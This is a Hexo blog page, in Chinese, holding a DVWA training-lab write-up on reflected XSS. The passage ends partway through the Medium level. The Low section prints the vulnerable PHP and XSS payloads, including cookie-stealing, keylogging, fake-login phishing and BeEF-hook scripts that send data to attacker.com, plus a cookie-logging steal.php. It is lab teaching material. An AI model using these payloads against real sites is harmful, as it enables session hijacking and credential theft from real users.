@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是反射型XSS（Reflected Cross-Site Scripting）？反射型XSS是一种客户端代码注入攻击，攻击者将恶意脚本注入到URL参数或表单中，服务器将这些恶意内容”反射”回页面并在浏览器中执行。 攻击流程：  攻击者构造包含恶意脚本的URL 受害者点击恶意链接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - XSS Reflected (反射型XSS) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是反射型XSS（Reflected Cross-Site Scripting）？反射型XSS是一种客户端代码注入攻击，攻击者将恶意脚本注入到URL参数或表单中，服务器将这些恶意内容”反射”回页面并在浏览器中执行。 攻击流程：  攻击者构造包含恶意脚本的URL 受害者点击恶意链接">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.143Z">
+<meta property="article:modified_time" content="2025-11-20T15:25:46.471Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - XSS Reflected (反射型XSS) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - XSS Reflected (反射型XSS) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:25:46" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>13 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是反射型XSS（Reflected-Cross-Site-Scripting）？"><a href="#什么是反射型XSS（Reflected-Cross-Site-Scripting）？" class="headerlink" title="什么是反射型XSS（Reflected Cross-Site Scripting）？"></a>什么是反射型XSS（Reflected Cross-Site Scripting）？</h3><p>反射型XSS是一种客户端代码注入攻击，攻击者将恶意脚本注入到URL参数或表单中，服务器将这些恶意内容”反射”回页面并在浏览器中执行。</p>
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>攻击者构造包含恶意脚本的URL</li>
+<li>受害者点击恶意链接</li>
+<li>服务器将恶意脚本反射到响应页面</li>
+<li>浏览器执行恶意脚本</li>
+</ol>
+<p><strong>危害：</strong></p>
+<ul>
+<li>窃取Cookie和Session</li>
+<li>钓鱼攻击</li>
+<li>键盘记录</li>
+<li>篡改页面内容</li>
+<li>重定向到恶意网站</li>
+<li>传播蠕虫</li>
+</ul>
+<p><strong>与存储型XSS的区别：</strong></p>
+<ul>
+<li>反射型：恶意代码在URL中，不存储在服务器</li>
+<li>存储型：恶意代码存储在数据库，持久化攻击</li>
+</ul>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤的输入输出，直接执行用户脚本。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 声明HTTP响应头：字符集为UTF-8 ★★★</span></span><br><span class="line"><span class="comment">// header() - 发送原始HTTP头到客户端</span></span><br><span class="line"><span class="comment">// Content-Type - 指定内容类型</span></span><br><span class="line"><span class="comment">// text/html - HTML文档</span></span><br><span class="line"><span class="comment">// charset=utf-8 - 字符编码为UTF-8</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在且非NULL</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;name&#x27;] - 从URL参数获取name的值</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接输出用户输入，无任何过滤！ ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[ &#x27;name&#x27; ] - 获取用户输入的name参数</span></span><br><span class="line">    <span class="comment">// 例如：?name=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line">    <span class="comment">// 问题：没有任何HTML编码、过滤或验证</span></span><br><span class="line">    <span class="comment">// 用户输入的任何内容都会直接插入HTML中执行</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>直接输出用户输入</strong> - 没有任何过滤</li>
+<li><strong>无HTML编码</strong> - 特殊字符<code>&lt;&gt;</code>不转义</li>
+<li><strong>无内容安全策略</strong> - 允许执行任意脚本</li>
+<li><strong>无输入验证</strong> - 接受任何字符</li>
+</ol>
+<p><strong>攻击原理：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 正常输入 --&gt;</span></span><br><span class="line">?name=Alice</span><br><span class="line">输出：<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello Alice<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- XSS攻击 --&gt;</span></span><br><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">输出：<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">结果：浏览器执行脚本，弹出XSS对话框</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础测试"><a href="#步骤1：基础测试" class="headerlink" title="步骤1：基础测试"></a>步骤1：基础测试</h4><p><strong>测试1：简单弹窗</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 完整URL --&gt;</span></span><br><span class="line">http://dvwa.local/dvwa/vulnerabilities/xss_r/?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 结果 --&gt;</span></span><br><span class="line">页面弹出对话框显示&quot;XSS&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试2：大小写混淆</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果有简单过滤，尝试大小写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>测试3：其他标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- img标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- body标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- svg标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：窃取Cookie"><a href="#步骤2：窃取Cookie" class="headerlink" title="步骤2：窃取Cookie"></a>步骤2：窃取Cookie</h4><p><strong>Payload：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 将Cookie发送到攻击者服务器</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/steal.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 简化版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location=<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用img标签（更隐蔽） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者服务器（steal.php）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 接收并记录Cookie</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookies.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&#x27; - &#x27;</span> . <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：键盘记录"><a href="#步骤3：键盘记录" class="headerlink" title="步骤3：键盘记录"></a>步骤3：键盘记录</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 记录用户输入</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/log.php?key=&#x27;</span> + e.<span class="property">key</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：钓鱼攻击"><a href="#步骤4：钓鱼攻击" class="headerlink" title="步骤4：钓鱼攻击"></a>步骤4：钓鱼攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// 创建假登录表单</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.body.innerHTML = `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Session Expired<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://attacker.com/phish.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤5：BeEF挂钩"><a href="#步骤5：BeEF挂钩" class="headerlink" title="步骤5：BeEF挂钩"></a>步骤5：BeEF挂钩</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- BeEF（Browser Exploitation Framework）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker.com:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 执行后，受害者浏览器会被BeEF控制 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤6：URL编码绕过"><a href="#步骤6：URL编码绕过" class="headerlink" title="步骤6：URL编码绕过"></a>步骤6：URL编码绕过</h4><p>如果链接被过滤，使用URL编码：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始：<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">URL编码：<span class="meta">%3Cscript</span><span class="meta">%3Ealert</span><span class="meta">%28</span><span class="meta">%27XSS</span><span class="meta">%27</span><span class="meta">%29</span><span class="meta">%3C</span><span class="meta">%2Fscript</span><span class="meta">%3E</span></span><br><span class="line"></span><br><span class="line">完整URL：</span><br><span class="line">http://dvwa.local/dvwa/vulnerabilities/xss_r/<span class="built_in">?name</span>=<span class="meta">%3Cscript</span><span class="meta">%3Ealert</span><span class="meta">%28</span><span class="meta">%27XSS</span><span class="meta">%27</span><span class="meta">%29</span><span class="meta">%3C</span><span class="meta">%2Fscript</span><span class="meta">%3E</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了简单的过滤，但可以绕过。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用str_replace()过滤&lt;script&gt;标签 ★★★</span></span><br><span class="line">    <span class="comment">// str_replace() - 字符串替换函数</span></span><br><span class="line">    <span class="comment">// 参数1：要查找的字符串（&lt;script&gt;）</span></span><br><span class="line">    <span class="comment">// 参数2：替换成的字符串（空字符串，即删除）</span></span><br><span class="line">    <span class="comment">// 